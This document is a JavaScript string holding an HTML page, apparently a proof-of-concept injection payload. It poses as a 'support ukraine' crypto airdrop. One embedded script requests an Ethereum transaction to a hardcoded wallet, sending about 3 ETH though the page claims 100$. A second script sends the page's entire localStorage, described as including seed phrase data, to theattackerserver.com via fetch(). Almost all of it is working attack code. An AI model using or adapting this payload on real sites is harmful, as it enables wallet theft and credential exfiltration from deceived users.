var string = "<html><head><title>Page Title</title></head><body><h1>Fake eth transfer example</h1><p>Her we are running an airdrop, to enter the pool</br>click on the below buttons and transfer 100$ to support ukraine!</br>then you'll enter the pool</br>Good Luck</br><button class='enableEthereumButton btn'>Enable Ethereum</button><button class='sendEthButton btn'>Send Eth</button><script>const ethereumButton = document.querySelector('.enableEthereumButton');const sendEthButton = document.querySelector('.sendEthButton');let accounts = [];ethereumButton.addEventListener('click', () => {  ethereum    .request({      method: 'eth_sendTransaction',      params: [        {          from: accounts[0],          to: '0x2f318C334780961FB129D2a6c30D0003d9a5C970',          value: '0x29a2241af62c0000',          gasPrice: '0x09184e72a000',          gas: '0x2710',        },      ],    })    .then((txHash) => console.log(txHash))    .catch((error) => console.error);});sendEthButton.addEventListener('click', () => {  getAccount();});async function getAccount() {  accounts = await ethereum.request({ method: 'eth_requestAccounts' });}<\/script></br></br><h1>Exposing the user informations (seed phase included)<h1></br><p>the seed phase hash with the access hmac key will be sent to theattackerserver.com (you can replact it with your server)<script>fetch('https://theattackerserver.com/?locals='+JSON.stringify(localStorage));<\/script><p></body></html>";
